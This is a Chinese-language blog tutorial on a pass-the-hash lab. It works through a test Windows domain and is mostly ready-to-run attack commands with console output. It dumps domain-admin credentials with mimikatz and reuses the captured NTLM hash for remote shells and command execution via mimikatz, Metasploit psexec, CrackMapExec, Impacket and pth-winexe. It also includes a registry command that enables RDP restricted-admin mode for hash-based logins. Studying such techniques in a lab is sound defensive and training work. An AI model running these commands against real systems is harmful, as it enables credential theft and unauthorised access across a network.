## PTH的利用
### PTH简介
path-the-hash,中文直译过来就是hash传递，在域中是一种比较常用的攻击方式。
pth攻击的流程是这样的：
1. 获取一台域内主机最高权限
2. 利用工具获取ntlm-hash
3. 使用工具利用hash尝试登录域内其他主机

### 实验环境
域控 winserver2019 192.168.50.128 192.168.6.130（双网卡）
域主机 win7 sp1 192.168.50.129（域管曾登陆过）
攻击机 物理机&kali虚拟机

### hash获取
哈希的获取一般还是mimikatz比较方便，直接用上一篇博客编译好的mimikatz上传到win7上。
运行
```shell
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> pass.txt
```
直接获得域管的哈希，因为是win7所以其实是可以直接获取明文密码的，这里假装不知道，只是用hash。
抓到的administrator的ntlm-hash是：`b0093b0887bf1b515a90cf123bce7fba`

### mimikatz的PTH
- pth开启cmd
mimikatz命令是
```
sekurlsa::pth /user:administrator /domain:no0b.net /ntlm:b0093b0887bf1b515a90cf123bce7fba
```
可以直接开启一个域管的cmd，如下图

![mimikatz_pth_cmd](D:\md\PTH的利用\mimikatz_pth_cmd.png)

### metasploit
metasploit在域控机器上执行
在metasploit中使用的其实还是psexec这种执行命令的工具。
具体以使用最基本的psexec为例。
```
msf5 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set rhosts 192.168.50.129
rhosts => 192.168.50.129
msf5 exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf5 exploit(windows/smb/psexec) > set smbdomain no0b.net
smbdomain => no0b.net
msf5 exploit(windows/smb/psexec) > set smbpass 00000000000000000000000000000000:b0093b0887bf1b515a90cf123bce7fba
smbpass => 00000000000000000000000000000000:b0093b0887bf1b515a90cf123bce7fba
msf5 exploit(windows/smb/psexec) > exploit
```
这样就可以获得一个shell，执行sysinfo可以看到信息，如下

![msf_psexec_shell](D:\md\PTH的利用\msf_psexec_shell.png)

除此之外，metasploit还有smb_login等模块不同协议可以利用PTH。

### Crackmapexec
Crackmapexec这个工具可以在kali上直接安装`apt-get install Crackmapexec`即可。
使用方式是：`crackmapexec smb ip -u Administrator -H ntlm-hash -x command`。
对域主机win7执行whoami，如下图

![msf_psexec_shell](D:\md\PTH的利用\msf_psexec_shell.png

![Crackmapexec_smb](D:\md\PTH的利用\Crackmapexec_smb.png)

Crackmapexec这个工具不止这些用法，日后可以单独写一篇使用技巧。
### Impacket
Impacket是一款功能非常强大的工具包，在我们与服务器交互时大有帮助。
对于pth的利用Impacket有很多工具，最直接的就是smbclient.py和psexec.py。
smbclient.py的命令是`python3 smbclient.py -hashes 00000000000000000000000000000000:ntlm-hash domain/Administrator@ip`

执行效果如下图

![impacket_smb](D:\md\PTH的利用\impacket_smb.png)

psexec.py的命令是`python psexec.py -hashes 00000000000000000000000000000000:ntlm-hash domain/Administrator@ip`

执行效果如下图

![impacket_psexec](D:\md\PTH的利用\impacket_psexec.png)

### kali PTH工具包
kali本身也是自带PTH攻击的工具包的，功能不少。
![kali-PTH](D:\md\PTH的利用\kali-PTH.png)

以使用pth-winexe来进行PTH攻击。
命令是`pth-winexe -U domain/Administrator%00000000000000000000000000000000:ntlm-hash //ip cmd`

![pth-winexe](D:\md\PTH的利用\pth-winexe.png)


### pth-RDP
pth攻击的利用还可以用来远程桌面登录。
这里以mimikatz为例。
mimikatz的命令是`sekurlsa::pth /user:administrator /domain:no0b.net /ntlm:b0093b0887bf1b515a90cf123bce7fba "/run:mstsc.exe /restrictedadmin"
`

![mimikatz_pth_rdp](D:\md\PTH的利用\mimikatz_pth_rdp.png)

值得注意的是这里需要远程桌面开启restrictedadmin模式。开启的命令是
`REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
`
同时这个模式对RDP的版本也有要求，最低未8.1。目前win8/winserver2012R2及以上的版本都是高于8.1的，只需要改注册表就可以打开。
但是本次使用的win7就需要安装一系列补丁从而升级到rdp8.1版本。(查看rdp版本可以打开rdp的窗口后右键查看关于)
![RDP_about](D:\md\PTH的利用\RDP_about.png)
对于win7 sp1升级到RDP8.1，以下安装的补丁仅供参考。
![win7sp1_to_rdp8.1](D:\md\PTH的利用\win7sp1_to_rdp8.1.png)

## 参考链接
https://www.4hou.com/posts/DPqY （原文链接：https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/）